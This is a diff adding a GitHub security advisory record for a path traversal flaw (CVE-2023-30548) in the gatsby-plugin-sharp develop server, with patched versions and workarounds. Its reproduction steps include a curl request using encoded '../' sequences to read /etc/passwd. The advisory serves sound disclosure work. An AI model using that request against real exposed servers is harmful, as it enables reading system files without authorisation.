@@ -1,0 +1,88 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-h2pm-378c-pcxx",
+  "modified": "2023-04-20T19:05:34Z",
+  "published": "2023-04-20T19:05:34Z",
+  "aliases": [
+    "CVE-2023-30548"
+  ],
+  "summary": "Path traversal vulnerability in gatsby-plugin-sharp",
+  "details": "### Impact\n\nThe gatsby-plugin-sharp plugin prior to versions 5.8.1 and 4.25.1 contains a path traversal vulnerability exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project, and install gatsby-plugin-sharp\n$ npm init gatsby\n$ cd my-gatsby-site\n$ npm install gatsby-plugin-sharp\n\n\n# Add the plugin to gatsby-config.js\nmodule.exports = {\n  plugins: [\n    {\n      resolve: `gatsby-plugin-sharp`,\n    },\n  ]\n}\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the path traversal vulnerability\n$ curl \"http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby-plugin-sharp@5.8.1` and `gatsby-plugin-sharp@4.25.1` which mitigates the issue by ensuring that included paths remain within the project directory.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Patrick Rombouts and Bart Veneman [drukwerkdeal.nl] for bringing the issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "gatsby-plugin-sharp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.0.0"
+            },
+            {
+              "fixed": "5.8.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "gatsby-plugin-sharp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.25.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-h2pm-378c-pcxx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30548"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gatsbyjs/gatsby/commit/5f442081b227cc0879babb96858f970c4ce94c6b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gatsbyjs/gatsby/commit/dcf88ed01df2c26e0c93a41e1a2a840076d8247e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gatsbyjs/gatsby"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-04-20T19:05:34Z",
+    "nvd_published_at": null
+  }
+}
